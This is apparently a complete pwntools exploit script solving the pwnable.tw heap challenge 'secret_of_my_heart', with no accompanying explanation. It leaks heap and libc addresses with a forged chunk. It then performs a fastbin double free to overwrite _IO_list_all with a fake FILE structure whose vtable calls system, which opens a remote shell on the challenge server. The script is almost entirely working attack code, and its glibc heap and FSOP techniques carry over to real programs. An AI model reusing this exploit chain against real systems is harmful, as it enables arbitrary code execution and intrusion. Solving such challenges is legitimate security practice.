#!/usr/bin/env python3
from pwn import *

PORT = 10302
HOST = "chall.pwnable.tw"
elf = context.binary = ELF('./secret_of_my_heart_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000000D6F
            brva 0x0000000000000E20
            brva 0x0000000000001022
            b* _IO_flush_all_lockp
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def menu(opt):
    sla(b'Your choice :', str(opt).encode())

def add(sz, name, sec):
    menu(1)
    sla(b'Size of heart : ', str(sz).encode())
    sa(b'Name of heart :', name)
    sa(b'secret of my heart :', sec)

def show(idx):
    menu(2)
    sla(b'Index :', str(idx).encode())

def delete(idx):
    menu(3)
    sla(b'Index :', str(idx).encode())

def secret():
    menu(0x1305)

# Stage 1: Leak heap, libc

add(0x98, b'A'*0x20, b'a')
show(0)
p.recvuntil(b'A'*0x20)
heap_base = u64(p.recv(6).ljust(8, b'\0')) - 0x10
log.info(f'heap_base: {hex(heap_base)}')
delete(0)

fake_chunk = flat(
    0, 0x91,
    heap_base + 0x1b8,
    heap_base + 0x1c0
    )


add(0x98, b'A'*0x20, fake_chunk)   #0
add(0x18, b'B'*0x20, b'1'*8)       #1
add(0xf8, b'C'*0x20, b'2'*8)       #2

add(0x18, b'D'*0x20, p64(heap_base+0x10)) #3
delete(1)

add(0x18, b'E'*0x20, b'1'*0x10 + p64(0xb0)) #1
delete(2) # free fake_chunk 

add(0x88, b'F'*0x20, b'\x00') # fake chunk #1

show(1)
p.recvuntil(b'Secret : ')
libc.address = u64(p.recv(6).ljust(8, b'\0')) - 0x3c3b78
log.info(f'libc_base: {hex(libc.address)}')
delete(2)

# Stage 2: Fastbin Dup overwrite _IO_list_all -> fake file (FSOP)

add(0x18, b'1'*0x20, b'a') #2
add(0x68, b'2'*0x20, b'b') #4
add(0x68, b'3'*0x20, b'c') #5
delete(1)  # A
delete(4)  # B -> A
delete(5)  # A -> B -> A
 
fake_file = flat({              # heap_base + 0x1f0
    0x00: b'   sh;\x00\x00',    # _flags
    0x20: 0,                    # _write_base
    0x28: 1,                    # _write_ptr
    0x68: 0,                    # _chain
    0x88: heap_base + 0x200,    # _lock
    0xc0: p32(0),               # _mode
    0xd8: heap_base + 0x120     # vtable
    }, filler = b'\x00', length = 0x100)

fake_vtable = flat(
    0,    #dump1
    0,    #dump2
    0,
    libc.sym.system   #__overflow
    )

add(0x100, b'fake_file', fake_file)
add(0x40, b'fake_vtable', fake_vtable)
# GDB()
add(0x68, b'setup', p64(libc.sym._IO_list_all - 0x23))
add(0x68, b'dump', b'dump')
add(0x68, b'dump', b'dump')

pl = flat(b'A'*(3 + 0x10), heap_base + 0x1f0)
add(0x68, b'overwrite', pl)
# GDB()
secret()

# p.sendline(b'cat home/secret_of_my_heart/flag')
p.interactive()

# d1nhdwc